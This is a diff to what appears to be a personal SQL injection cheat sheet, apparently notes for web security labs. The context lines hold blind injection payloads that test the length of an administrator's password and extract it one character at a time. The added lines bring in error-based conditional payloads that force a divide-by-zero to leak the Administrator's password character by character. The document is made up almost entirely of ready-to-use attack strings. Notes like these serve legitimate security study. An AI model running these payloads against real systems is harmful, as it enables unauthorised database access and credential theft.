@@ -44,5 +44,13 @@ SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a # check password length
 ' AND (SELECT SUBSTRING(password,17,1) FROM users WHERE username='administrator')%3d'y; #check for
 
+#ERROR SQLi
+#Determine if there is any diffrence to find error based sqli
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+
+#then possilby check other things
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
 
   
